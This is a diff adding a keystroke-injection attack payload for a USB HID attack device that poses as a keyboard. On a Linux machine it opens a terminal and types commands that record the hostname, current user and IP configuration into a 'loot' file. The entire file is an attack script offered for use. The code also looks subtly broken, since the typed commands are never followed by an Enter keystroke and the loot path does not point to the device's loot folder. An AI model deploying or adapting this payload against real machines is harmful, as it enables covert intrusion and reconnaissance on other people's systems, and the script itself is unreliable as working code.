@@ -1,0 +1,47 @@
+#!/bin/bash
+#Name: SystemCataloger
+#Scripter: Ryan_Van_Mass
+#Description: Collect basic system information
+#target: Linux
+
+############## SETUP ##############
+LED SETUP
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+
+#Make loot Directory
+mkdir -p /root/udisk/loot/SystemCataloger
+LOOT=$(hostname -s).txt
+
+############## ATTACK ##############
+LED ATTACK
+sleep 5
+
+#Opens the Terminal
+QUACK GUI
+sleep 5
+QUACK STRING "Terminal"
+sleep 5
+QUACK ENTER
+sleep 5
+
+
+QUACK STRING echo HOSTNAME >> $LOOT
+QUACK STRING echo -------- >> $LOOT
+QUACK STRING hostname >> $LOOT
+sleep 3
+
+QUACK STRING echo CURRENT USER >> $LOOT 
+QUACK STRING echo ------------ >> $LOOT
+QUACK STRING whoami >> $LOOT
+
+
+QUACK STRING echo IP CONFIGURATION >> $LOOT
+QUACK STRING echo ---------------- >> $LOOT
+QUACK STRING ip address >> $LOOT
+
+QUACK STRING echo NEOFETCH >> $LOOT
+QUACK STRING echo -------- >> $LOOT
+QUACK STRING neofetch
+
+LED FINISH
